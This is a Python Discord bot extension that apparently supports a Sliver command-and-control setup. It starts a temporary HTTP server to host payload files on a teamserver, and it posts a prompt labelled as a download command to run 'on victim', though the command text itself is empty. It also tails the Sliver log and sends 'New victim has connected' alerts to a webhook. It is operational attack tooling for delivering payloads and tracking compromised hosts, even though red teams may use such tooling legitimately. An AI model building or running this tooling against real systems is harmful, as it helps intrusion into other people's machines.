import discord
import asyncio
import os
import signal
import aiohttp
from discord.ext import commands, tasks
from discord import app_commands

from cogs.utils.notification_msg import NotificationMsg

TEAMSERVER_IP = os.getenv('TEAMSERVER_IP')
DIRECTORY = os.getenv('DIRECTORY')
ALERT_URL = os.getenv('ALERT_URL')
SLIVER_LOG_PATH = os.getenv('SLIVER_LOG_PATH')

class HostView(discord.ui.View):
    def __init__(self, process, port, timeout_task):
        super().__init__(timeout=None)
        self.process = process
        self.port = port
        self.timeout_task = timeout_task

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.danger)
    async def stop_server_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.process.returncode is None:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                
            except Exception as e:
                try: 
                    self.process.kill()
                
                except:
                    pass
                
        if not self.timeout_task.done():
            self.timeout_task.cancel()
        
        self.clear_items()
        await interaction.response.edit_message(content=f"Server stopped by {interaction.user.mention}.", view=self)

class C2Payload(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.alert_url = ALERT_URL
        self.sliver_log_path = SLIVER_LOG_PATH
        self.last_log_size = 0

        self.monitor_sliver.start()

    def cog_unload(self):
        self.monitor_sliver.cancel()

    @tasks.loop(seconds=5)
    async def monitor_sliver(self):
        if not os.path.exists(self.sliver_log_path):
            print(f"Sliver log file not found at {self.sliver_log_path}")
            return
        
        current_size = os.path.getsize(self.sliver_log_path)

        if self.last_log_size == 0:
            self.last_log_size = current_size
            return

        if current_size < self.last_log_size:
            self.last_log_size = 0
            return

        if current_size > self.last_log_size:
            with open(self.sliver_log_path, 'r', encoding='utf-8') as f:
                f.seek(self.last_log_size)
                new_lines = f.readlines()
                self.last_log_size = current_size
                
                for line in new_lines:
                    line_lower = line.lower()
                    # Lọc các dòng log báo hiệu có session mới
                    if ("session" in line_lower or "beacon" in line_lower) and ("opened" in line_lower or "connected" in line_lower or "started" in line_lower):
                        await self.send_alert_to_api(line.strip())

    async def send_alert_to_api(self, log_message):
        """Send POST Request containing JSON payload to server 10.7.0.7"""
        payload = {
            "type": "Sliver C2 Alert",
            "message": f"New victim has connected via Sliver!\nDetails: {log_message}",
            "status": "success",
            "to_channel": "c2_server"
        }
        try:
            async with aiohttp.ClientSession() as session:
                await session.post(self.alert_url, json=payload, timeout=5)
                print(f"Successfully sent alert to {self.alert_url}")

        except Exception as e:
            print(f"Error sending HTTP request to {self.alert_url}: {e}")

    @app_commands.command(name="c2-server", description="Start a C2 server")
    @app_commands.describe(
        directory="The directory to host (default: /opt/temp)",
        port="The port to listen on (default: 8088)",
    )
    async def host_payload(self, interaction: discord.Interaction, directory: str = DIRECTORY, port: int = 8088):
        
        # Check directory exists
        if not os.path.exists(directory):
            embed_dir_not_found = NotificationMsg.error_msg(
                    title="Directory not found", 
                    description=f"The directory {directory} does not exist."
                )
            await interaction.response.send_message(
                embed=embed_dir_not_found,
                ephemeral=True
                )
            return
        
        await interaction.response.defer()

        try:
            # Start the server
            process = await asyncio.create_subprocess_exec(
                'python3', '-m', 'http.server', str(port), "-d", directory,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                preexec_fn=os.setpgrp
            )

            # Auto kill the server after 5 minutes
            async def auto_kill_server():
                try:
                    # Wait for 5 minutes
                    await asyncio.sleep(300)
                    
                    if process.returncode is None:
                        # Kill the server
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)

                        try:
                            msg = await interaction.original_response()
                            empty_view = discord.ui.View()
                            await msg.edit(
                                content=f"⏱️ **System:** HTTP Server port `{port}` has been **AUTOMATICALLY SHUT DOWN** after 5 minutes to ensure security.", 
                                view=empty_view
                            )
                        except:
                            pass
                except asyncio.CancelledError:
                    pass

            # Create a timeout task
            timeout_task = asyncio.create_task(auto_kill_server())

            # Create the view
            view = HostView(process, port, timeout_task)

            teamserver_ip = TEAMSERVER_IP

            desc = (
                f"✅ **HTTP Server is running!**\n"
                f"🌐 **Teamserver IP:** `{teamserver_ip}:{port}`\n"
                f"📂 **Directory:** `{directory}`\n"
                f"💻 **Command to get file (Use on victim):**\n"
                f"⏳ *System will automatically close port after 5 minutes.*"
            )

            await interaction.followup.send(content=desc, view=view)

        except Exception as e:
            embed_error = NotificationMsg.error_msg(
                title="Error",
                description=f"An error occurred while starting the server: {e}"
            )
            await interaction.followup.send(embed=embed_error, ephemeral=True)

async def setup(bot):
    await bot.add_cog(C2Payload(bot))